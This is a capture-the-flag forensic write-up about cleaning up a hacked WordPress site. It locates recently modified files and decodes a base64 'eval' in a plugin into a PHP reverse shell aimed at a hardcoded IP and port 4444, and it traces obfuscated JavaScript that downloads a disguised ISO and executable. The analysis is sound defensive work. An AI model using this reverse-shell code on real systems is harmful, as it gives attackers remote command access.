---
layout: post
title:  "HTB University CTF 2022: Fake News"
date:   2022-12-05 00:00:00
tags: [Wordpress, Binary, PHP]
description: 'Analyse how a wordpress page have been hacked.'
categories: [WriteUp, Forensic, HTB-University-CTF-2022]
---

## Challenge Information
![Desktop View](/assets/img/fake-news-info.png){: .shadow }
A wordpress website has been compomised. Unluckly there is no backup from
before the hack. The job is to remove all dangerous artifacts and recover the
system to its previous state.


## Investigate the Wordpress source code
We are given a folder named `html` which contains the source code of the hacked
WordPress page. Due to the number of files I searched for the last modified
file using the command `ls -ltA --full-time`.
![ls output](/assets/img/fake-news-ls.png)
I ended up with two folders that had been changed on `2022-11-24`. The next
logical step was to find all files that had been modified within that
timeframe.
```bash
$ find . -type f -newermt "nov 24, 2022" -ls | grep -v png

... Nov 24 17:28 ./wp-blogs/2022/11/style.css
... Nov 24 17:28 ./wp-blogs/2022/11/index.php
... Nov 24 17:22 ./wp-content/plugins/plugin-manager/plugin-manager.php
... Nov 24 17:22 ./wp-content/plugins/plugin-manager/plugin.php
... Nov 24 16:11 ./wp-content/themes/maintheme/style.css
... Nov 24 16:11 ./wp-content/themes/maintheme/footer.php
... Nov 24 16:11 ./wp-content/themes/maintheme/header.php
... Nov 24 16:12 ./wp-content/themes/maintheme/sidebar.php
... Nov 24 16:11 ./wp-content/themes/maintheme/index.php
... Nov 24 16:10 ./.htaccess
... Nov 24 16:09 ./wp-config.php
```
By looking carefully through the files, I found two weird looking files:
- `eval` command inside the file `plugin-manager.php`
- obfuscated JavaScript code in the file `index.php` which is stored in the folder `wp-blogs`


## Reverse shell
The eval command seemed base64 encoded, so I decoded it. The decoded PHP script
looks like a typical reverse shell which contains the first part of the flag.
```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '77.74.198.52';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$part1 = "HTB{C0m3_0n";
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
...
```


## Internal Phishing Website
The easiest way to reveal JavaScript code is to run it. I opened up the
malicious `index.php` file inside a virtual machine. At first the page only shows
a train ticket, but after a short time, the browser starts downloading the file
`official_invitation.iso`.

![train ticket](/assets/img/fake-news-ticket.png)

Because I didn't want to mount the file, one of my teammates suggested I unpack
it. It appears that `.iso` files are nothing more than archives. A file called
`official_invitation.exe` was created. Using the following command, I found the
second part of the flag.
```bash
strings official_invitation.exe | tail -100 | head -20
```
